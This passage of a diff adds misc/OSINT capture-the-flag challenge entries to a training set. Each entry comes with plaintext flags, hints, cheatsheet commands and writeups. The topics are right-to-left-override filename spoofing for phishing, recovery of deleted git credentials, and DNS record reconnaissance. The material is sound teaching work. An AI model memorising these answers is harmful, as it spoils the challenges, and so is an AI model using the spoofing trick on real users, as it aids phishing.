+    "concept": "Open-Source Intelligence (OSINT) and visual information leakage",
+    "cheatsheet": "gimp social_post.png (Levels & Curves adjustment)",
+    "badge": "OSINT Investigator",
+    "writeup": "Sharpening the image reveals the terminal window showing the hostname."
+  },
+  {
+    "id": "misc-02",
+    "title": "Damaged QR Code Restoration",
+    "category": "Misc/OSINT",
+    "points": 100,
+    "difficulty": "Easy",
+    "description": "A torn QR code from an event poster was scanned. Reconstruct the missing alignment patterns using Reed-Solomon correction to read the flag.",
+    "flag": "flag{QR_3rr0r_C0rr3ct10n_S4v3s_Th3_D4y}",
+    "file_url": "https://raw.githubusercontent.com/BrianC0des/cylab-challenges/main/files/misc/damaged_qr.png",
+    "hints": [
+      {
+        "text": "QR codes feature up to 30% Reed-Solomon error tolerance.",
+        "penalty": 10
+      },
+      {
+        "text": "Use zbarimg or pyzbar to decode directly.",
+        "penalty": 15
+      }
+    ],
+    "concept": "QR code geometry and Reed-Solomon error correction",
+    "cheatsheet": "zbarimg damaged_qr.png",
+    "badge": "Code Reconstructor",
+    "writeup": "Reed-Solomon recovery algorithms allow direct decoding without manual repair."
+  },
+  {
+    "id": "misc-03",
+    "title": "Right-to-Left Override (RLO) Trap",
+    "category": "Misc/OSINT",
+    "points": 200,
+    "difficulty": "Medium",
+    "description": "A phishing attachment appears as 'Quarterly_Report_2026_gpj.pdf' but executes as a binary. Analyze the Unicode RLO character (U+202E).",
+    "flag": "flag{RL0_Un1c0d3_D1sgu1s3}",
+    "file_url": "https://raw.githubusercontent.com/BrianC0des/cylab-challenges/main/files/misc/sample.bin",
+    "hints": [
+      {
+        "text": "Unicode character U+202E reverses the visual rendering order of following text.",
+        "penalty": 15
+      },
+      {
+        "text": "Inspect the filename in hex: file name contains \\xE2\\x80\\xAE.",
+        "penalty": 20
+      }
+    ],
+    "concept": "Unicode Right-to-Left Override (RLO) file extension spoofing",
+    "cheatsheet": "python3 -c \"print(repr(filename))\"",
+    "badge": "Phishing Detector",
+    "writeup": "Reversing the RLO trick reveals the true extension is .exe disguised visually as .pdf."
+  },
+  {
+    "id": "misc-04",
+    "title": "Git Commit Reflog Ghost",
+    "category": "Misc/OSINT",
+    "points": 200,
+    "difficulty": "Easy",
+    "description": "A developer accidentally committed API credentials to a public git repo, then ran git reset --hard to delete it. Recover the dangling commit.",
+    "flag": "flag{G1t_R3fl0g_S4v3s_Cr3ds}",
+    "file_url": "https://raw.githubusercontent.com/BrianC0des/cylab-challenges/main/files/misc/repo.bundle",
+    "hints": [
+      {
+        "text": "Git objects are not purged immediately; dangling commits remain in the object store.",
+        "penalty": 10
+      },
+      {
+        "text": "Run git reflog or git fsck --lost-found to locate unreachable commit hashes.",
+        "penalty": 20
+      }
+    ],
+    "concept": "Git forensics, dangling object recovery, and git reflog analysis",
+    "cheatsheet": "git reflog ; git fsck --lost-found ; git show <dangling_hash>",
+    "badge": "Git Archaeologist",
+    "writeup": "Git fsck --lost-found locates the orphaned commit object containing the uncommitted flag."
+  },
+  {
+    "id": "misc-05",
+    "title": "CyberChef Multi-Stage Recipe",
+    "category": "Misc/OSINT",
+    "points": 250,
+    "difficulty": "Medium",
+    "description": "An encoded puzzle was found on a hacker forum: Base64 -> Gzip compressed -> Hex encoded -> ROT13 shifted. Build the decoding pipeline.",
+    "flag": "flag{Cyb3rCh3f_Ch41n_M4st3r}",
+    "file_url": "https://raw.githubusercontent.com/BrianC0des/cylab-challenges/main/files/misc/cipher_chain.txt",
+    "hints": [
+      {
+        "text": "Reverse the operations in order: ROT13 -> From Hex -> Gunzip -> From Base64.",
+        "penalty": 15
+      },
+      {
+        "text": "Paste into CyberChef and drag the corresponding operations into the recipe.",
+        "penalty": 20
+      }
+    ],
+    "concept": "Multi-stage deobfuscation and CyberChef recipe chaining",
+    "cheatsheet": "CyberChef: ROT13(13) -> From_Hex('Auto') -> Gunzip() -> From_Base64()",
+    "badge": "Recipe Chef",
+    "writeup": "Chaining the 4 inverse operations in CyberChef unpacks the layered payload."
+  },
+  {
+    "id": "misc-06",
+    "title": "DNS TXT & SPF Record Recon",
+    "category": "Misc/OSINT",
+    "points": 150,
+    "difficulty": "Easy",
+    "description": "A municipal domain had verification tokens stored in public DNS TXT records during a cloud migration. Enumerate DNS records to recover the flag.",
+    "flag": "flag{DN5_Txt_R3c0rd_R3c0n}",
+    "file_url": "https://raw.githubusercontent.com/BrianC0des/cylab-challenges/main/files/misc/dns_zone.txt",
+    "hints": [
+      {
+        "text": "Query DNS TXT and SPF records for the domain.",
+        "penalty": 10
+      },
+      {
+        "text": "dig txt target.gov.ph or nslookup -type=txt target.gov.ph.",
+        "penalty": 15
+      }
+    ],
+    "concept": "DNS enumeration, TXT records, and OSINT domain reconnaissance",
+    "cheatsheet": "dig +nocmd TXT target.gov.ph +noall +answer",
+    "badge": "DNS Scout",
+    "writeup": "Querying TXT records exposes verification strings including the flag."
+  }
+]
